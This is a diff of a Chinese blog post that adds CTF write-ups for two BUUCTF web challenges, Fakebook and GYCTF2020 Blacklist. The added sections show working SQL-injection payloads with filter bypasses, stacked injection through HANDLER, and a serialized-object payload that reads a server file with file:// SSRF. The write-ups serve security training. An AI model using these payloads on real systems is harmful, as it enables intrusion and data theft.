@@ -33,7 +33,7 @@
                             "url": "https:\/\/1iu2y.github.io\/posts\/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4\/featured-image.png",
                             "width":  1975 ,
                             "height":  910 
-                        }],"genre": "posts","keywords": "CTF, web","wordcount":  884 ,
+                        }],"genre": "posts","keywords": "CTF, web","wordcount":  2606 ,
         "url": "https:\/\/1iu2y.github.io\/posts\/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4\/","datePublished": "2021-08-24T19:10:31+08:00","dateModified": "2021-08-24T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -110,8 +110,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">BUUCTF Web记录 4</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>zyleo</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-24">2021-08-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 884 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-24">2021-08-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2606 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -132,7 +132,16 @@
         <li><a href="#参考链接">参考链接</a></li>
       </ul>
     </li>
-    <li><a href="#0x02-网鼎杯-2018fakebook">0x02 [网鼎杯 2018]Fakebook</a></li>
+    <li><a href="#0x02-网鼎杯-2018fakebook">0x02 [网鼎杯 2018]Fakebook</a>
+      <ul>
+        <li><a href="#总结">总结</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-gyctf2020blacklist">0x03 [GYCTF2020]Blacklist</a>
+      <ul>
+        <li><a href="#参考链接-1">参考链接</a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
             </div><div class="content" id="content"><p>已经到第4篇了，不容易啊</p>
@@ -298,8 +307,8 @@ else{
 </ul>
 <h2 id="0x02-网鼎杯-2018fakebook">0x02 [网鼎杯 2018]Fakebook</h2>
 <p><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Fakebook" target="_blank" rel="noopener noreffer">题目链接</a></p>
-<p>fakebook，自己提交信息然后点join，就可以在网站上看到，<del>这题应该是xss</del>。</p>
-<p>试了一下，用户名可以xss。</p>
+<p>fakebook，自己提交信息然后点join，就可以在网站上看到，<del>这题应该是xss</del>好吧并不是。</p>
+<p><del>试了一下，用户名可以xss。</del></p>
 <p><figure><a class="lightgallery" href="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825111401320.png" title="image-20210825111401320" data-thumbnail="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825111401320.png" data-sub-html="<h2>join</h2><p>image-20210825111401320</p>">
         <img
             class="lazyload"
@@ -309,7 +318,348 @@ else{
             data-sizes="auto"
             alt="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825111401320.png" />
     </a><figcaption class="image-caption">join</figcaption>
-    </figure></p></div><div class="post-footer" id="post-footer">
+    </figure></p>
+<p>注册之后提交，发现浏览方式为请求<code>/view.php?no=1</code>，看一下能不能注入（不能只认为输入框才存在注入）。</p>
+<p><code>union select</code>被过滤了，可以用<code>union/**/select</code>绕过。尝试之后发现查询语句的结果有4列。同时为了得到回显信息，我们需要把<code>no=1</code>改为<code>no=-1</code>，使它自己本身的查询语句没有结果，这样才能让网页显示注入内容的回显。</p>
+<p><code>/view.php?no=-1 union/**/select 1,database(),3,4#</code>得到数据库名为<code>fakebook</code></p>
+<p><code>/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;#</code>得到<code>fakebook</code>库中有个表为<code>users</code></p>
+<p><code>/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4  from information_schema.columns where table_name=&quot;users&quot;#</code>得到表<code>users</code>的列为<code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></p>
+<p>接下来不知道该干嘛了。web题不知道干嘛的话就先扫一下目录吧。</p>
+<p>dirsearch扫出来源码备份<code>user.php.bak</code>文件（我至今仍然不知道为什么我用这东西一般都扫不出来什么有价值的结果）。里面定义了一个<code>UserInfo</code>类型，应该就是我们join时输入的内容。其中<code>isValidBlog()</code>会对<code>blog</code>字段过滤，<code>getBlogContents()</code>会请求博客内容并显示。看到这里就应该有点感觉了，这题的预期解应该是绕过blog字段的判断，然后ssrf读取服务端的flag。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+
+<span class="k">class</span> <span class="nc">UserInfo</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$blog</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span> <span class="o">=</span> <span class="nv">$blog</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
+
+        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">getBlogContents</span> <span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">isValidBlog</span> <span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$blog</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>再配合输入<code>/view.php?no=-1 union/**/select 1,group_concat(data),3,4 from users#</code>，会得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:4:&#34;test&#34;;s:3:&#34;age&#34;;i:14;s:4:&#34;blog&#34;;s:9:&#34;dtest.com&#34;;},O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:3:&#34;leo&#34;;s:3:&#34;age&#34;;i:22;s:4:&#34;blog&#34;;s:15:&#34;1iu2y.github.io&#34;;},O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:40:&#34;tes2&#34;;s:3:&#34;age&#34;;i:14;s:4:&#34;blog&#34;;s:9:&#34;fwfwf.com&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div><p>这刚好就是<code>UserInfo</code>的序列化结果。所以可以猜到view.php的逻辑就是根据<code>no</code>查询，再将查询结果的<code>data</code>栏进行反序列化，得到<code>blog</code>内容，然后调用<code>getblogcontents()</code>。所以我们通过修改反序列化的输入，就能够绕过<code>isValidBlog()</code>的判断。</p>
+<p>而我们之前得到的列名结果为<code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code>，<code>data</code>在第四列，所以构造的反序列化字符串应该放在select的第四个位置。再结合php伪协议<code>file://</code>，以及<code>/flag.php</code>的请求结果为200（理论上来说这一点在扫描的时候就能够得知），可以构造以下payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/view.php?no=-1 union/**/select 1,2,3,&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:1:&#34;a&#34;;s:3:&#34;age&#34;;i:10;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;#
+</code></pre></td></tr></table>
+</div>
+</div><p>查看源码得到base64编码。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825140012191.png" title="image-20210825140012191" data-thumbnail="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825140012191.png" data-sub-html="<h2>base64</h2><p>image-20210825140012191</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210825140012191.png"
+            data-srcset="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825140012191.png, image-20210825140012191.png 1.5x, /posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825140012191.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/image-20210825140012191.png" />
+    </a><figcaption class="image-caption">base64</figcaption>
+    </figure></p>
+<p>解码得到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="nv">$flag</span> <span class="o">=</span> <span class="s2">&#34;flag{340198f3-c539-4aac-8a0c-5c6759155623}&#34;</span><span class="p">;</span>
+<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="总结">总结</h3>
+<p>这题结合了<strong>get请求注入</strong>、<strong>目录扫描</strong>、<strong>反序列化</strong>、<strong>php伪协议</strong>多个要素，是一道很有意思的题，也是目前为止我刷buuoj过程中碰到的最难的web题。</p>
+<h2 id="0x03-gyctf2020blacklist">0x03 [GYCTF2020]Blacklist</h2>
+<p><a href="https://buuoj.cn/challenges#[GYCTF2020]Blacklist" target="_blank" rel="noopener noreffer">题目链接</a></p>
+<p><code>1' or 1=1#</code>看到当前表中存了3条记录。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">array(2) {
+  [0]=&gt;
+  string(1) &#34;1&#34;
+  [1]=&gt;
+  string(7) &#34;hahahah&#34;
+}
+
+array(2) {
+  [0]=&gt;
+  string(1) &#34;2&#34;
+  [1]=&gt;
+  string(12) &#34;miaomiaomiao&#34;
+}
+
+array(2) {
+  [0]=&gt;
+  string(6) &#34;114514&#34;
+  [1]=&gt;
+  string(2) &#34;ys&#34;
+}
+</code></pre></td></tr></table>
+</div>
+</div><p><code>1' union select 1,2,3 #</code>发现<code>set</code>/<code>select</code>等不论大小写都被过滤了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">return preg_match(&#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&#34;,$inject);
+</code></pre></td></tr></table>
+</div>
+</div><p>这又难到了我，看了一下报错注入也需要<code>select</code>啊，怎么操作呢？查阅博客后回想起，注入不是只有<strong>union联合注入</strong>、<strong>updataxml报错注入</strong>等，还有<strong>堆叠注入</strong>啊。</p>
+<p><code>1';show tables;#</code>查看所有表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">array(2) {
+  [0]=&gt;
+  string(1) &#34;1&#34;
+  [1]=&gt;
+  string(7) &#34;hahahah&#34;
+}
+------------------------
+array(1) {
+  [0]=&gt;
+  string(8) &#34;FlagHere&#34;
+}
+
+array(1) {
+  [0]=&gt;
+  string(5) &#34;words&#34;
+}
+------------------------
+</code></pre></td></tr></table>
+</div>
+</div><p><code>1';desc FalgHere;#</code>查看<code>FlagHere</code>表的结构</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">array(2) {
+  [0]=&gt;
+  string(1) &#34;1&#34;
+  [1]=&gt;
+  string(7) &#34;hahahah&#34;
+}
+------------------------
+array(6) {
+  [0]=&gt;
+  string(4) &#34;flag&#34;
+  [1]=&gt;
+  string(12) &#34;varchar(100)&#34;
+  [2]=&gt;
+  string(2) &#34;NO&#34;
+  [3]=&gt;
+  string(0) &#34;&#34;
+  [4]=&gt;
+  NULL
+  [5]=&gt;
+  string(0) &#34;&#34;
+}
+------------------------
+</code></pre></td></tr></table>
+</div>
+</div><p>flag就在这里了。接下来可以用<code>prepare</code>设置计划任务，也可以<code>rename</code>更改表名，但是这些关键字都被过滤了。所以这里需使用<code>handler</code>来实现注入。😶</p>
+<blockquote>
+<p>在堆叠注入中，可以利用<code>handler</code>直接列出需要查询内容的表的数据，只需要知道表名</p>
+<ul>
+<li><a href="https://blog.csdn.net/mochu7777777/article/details/109577534" target="_blank" rel="noopener noreffer">https://blog.csdn.net/mochu7777777/article/details/109577534</a></li>
+</ul>
+</blockquote>
+<p><code>1';handler FlagHere open;handler FlagHere read first;#</code>即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">array(2) {
+  [0]=&gt;
+  string(1) &#34;1&#34;
+  [1]=&gt;
+  string(7) &#34;hahahah&#34;
+}
+------------------------
+array(1) {
+  [0]=&gt;
+  string(42) &#34;flag{eb3f6fba-9f4e-402a-9252-c258ce1fe7cb}&#34;
+}
+------------------------
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="参考链接-1">参考链接</h3>
+<ul>
+<li><a href="https://qwzf.github.io/2020/05/02/i%E6%98%A5%E7%A7%8B2020%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%20GYCTF%E6%9C%89%E5%85%B3SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener noreffer">i春秋2020新春公益赛 GYCTF有关SQL注入题复现</a></li>
+</ul></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
